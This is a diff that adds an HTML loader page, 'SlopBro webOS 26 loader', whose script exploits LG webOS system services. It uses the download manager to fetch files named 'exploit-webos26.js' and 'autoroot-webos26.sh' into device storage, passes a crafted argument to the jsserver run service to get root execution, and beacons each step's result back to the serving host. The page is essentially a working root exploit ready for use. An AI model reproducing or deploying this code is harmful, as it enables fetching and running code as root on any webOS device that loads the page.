@@ -1,0 +1,85 @@
+<!doctype html>
+<meta charset="utf-8">
+<title>SlopBro webOS 26 loader</title>
+<h2 id="status">Preparing compatible webOS 26 loader…</h2>
+<script>
+(function () {
+  var base = location.protocol + "//" + location.host + "/";
+  var targetDir = "/media/internal/downloads";
+  var files = [
+    ["package-webos26.json", "package.json"],
+    ["services.json", "services.json"],
+    ["exploit-webos26.js", "exploit-webos26.js"],
+    ["autoroot-webos26.sh", "autoroot-webos26.sh"]
+  ];
+  var status = document.getElementById("status");
+  var started = false;
+
+  function bridge() {
+    var Bridge = typeof webOSServiceBridge === "function"
+      ? webOSServiceBridge
+      : PalmServiceBridge;
+    return new Bridge();
+  }
+
+  function beacon(name, message) {
+    var image = new Image();
+    image.src = base + name + "?m=" + encodeURIComponent(message) + "&t=" + Date.now();
+  }
+
+  function download(index) {
+    if (index >= files.length) {
+      status.textContent = "Payload ready; requesting root execution…";
+      setTimeout(run, 1000);
+      return;
+    }
+
+    var source = files[index][0];
+    var destination = files[index][1];
+    status.textContent = "Writing " + destination + " (" + (index + 1) + "/" + files.length + ")…";
+    var b = bridge();
+    var finished = false;
+    b.onservicecallback = function (message) {
+      beacon("compat-download", destination + ":" + message);
+      try {
+        var response = JSON.parse(message);
+        if (!finished && response.completed === true && !response.aborted && !response.interrupted) {
+          finished = true;
+          setTimeout(function () { download(index + 1); }, 700);
+        }
+      } catch (_) {}
+    };
+    b.call("luna://com.webos.service.downloadmanager/download", JSON.stringify({
+      target: base + source,
+      targetDir: targetDir,
+      targetFilename: destination,
+      subscribe: true
+    }));
+  }
+
+  function run() {
+    var b = bridge();
+    b.onservicecallback = function (message) {
+      status.textContent = "Run response: " + message;
+      beacon("compat-run-result", message);
+    };
+    var payload = { inputParams: "-- /tmp/cgroup dummy " + targetDir };
+    beacon("compat-run-request", JSON.stringify(payload));
+    b.call("luna://com.webos.service.jsserver/run", JSON.stringify(payload));
+  }
+
+  function startDownloads() {
+    if (started) return;
+    started = true;
+    download(0);
+  }
+
+  var cancel = bridge();
+  cancel.onservicecallback = function (message) {
+    beacon("compat-cancel", message);
+    setTimeout(startDownloads, 800);
+  };
+  cancel.call("luna://com.webos.service.downloadmanager/cancelAllDownloads", "{}");
+  setTimeout(startDownloads, 2500);
+})();
+</script>
